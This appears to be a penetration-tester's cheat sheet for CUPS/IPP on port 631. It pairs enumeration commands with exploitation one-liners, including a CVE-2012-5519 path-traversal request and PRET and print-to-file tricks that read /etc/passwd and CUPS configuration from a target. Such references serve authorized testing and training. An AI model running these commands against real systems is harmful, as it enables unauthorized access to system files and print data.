# Port 631 - IPP (Internet Printing Protocol) / CUPS

## Table of Contents
- [Enumeration](#enumeration)
- [CUPS Web Interface](#cups-web-interface)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s "http://$rhost:631/printers" && nmap -p 631 --script "cups-info,cups-queue-info" $rhost
```

### Nmap

```shell
nmap -sV -sC -p 631 $rhost
nmap -p 631 --script "cups-info" $rhost
nmap -p 631 --script "cups-queue-info" $rhost
```

### Web Interface

```shell
# Access CUPS web interface
curl -s "http://$rhost:631/"
curl -s "http://$rhost:631/printers"
curl -s "http://$rhost:631/jobs"
```

### IPP Enumeration

```shell
# Using ipptool
ipptool -tv http://$rhost:631/ipp/print get-printer-attributes.test

# List printers
ipptool http://$rhost:631/printers/ get-printers.test
```

---

## CUPS Web Interface

### Common Endpoints

| Endpoint | Description |
| :--- | :--- |
| `/` | Main page |
| `/admin` | Administration |
| `/printers` | List printers |
| `/classes` | Printer classes |
| `/jobs` | Print jobs |

### Default Credentials

> CUPS uses system credentials (root or lpadmin group)

---

## Exploitation

### Information Disclosure

```shell
# Get printer info
curl -s "http://$rhost:631/printers/"

# Get job history (may contain sensitive data)
curl -s "http://$rhost:631/jobs?which_jobs=all"

# Get configuration
curl -s "http://$rhost:631/admin/conf/cupsd.conf"
```

### CVE-2012-5519 - CUPS File Read

> Allows reading arbitrary files (CUPS < 1.6.2)

```shell
# Read file via error log
curl "http://$rhost:631/admin/log/error_log?../../../../../../etc/passwd"
```

### Print to File (If Enabled)

```shell
# If CUPS allows print-to-file
lp -d printer_name -o outputorder=reverse /etc/passwd -o outputfile=/tmp/output
```

### PRET - Printer Exploitation

```shell
# Using PRET
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

# Connect via IPP
python pret.py $rhost ipp

# Commands
ls
get /etc/passwd
info
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `curl http://$rhost:631/` | Access CUPS web |
| `curl http://$rhost:631/printers` | List printers |
| `nmap -p 631 --script "cups-*" $rhost` | CUPS enumeration |
| `lpstat -h $rhost -a` | List printers via lpstat |
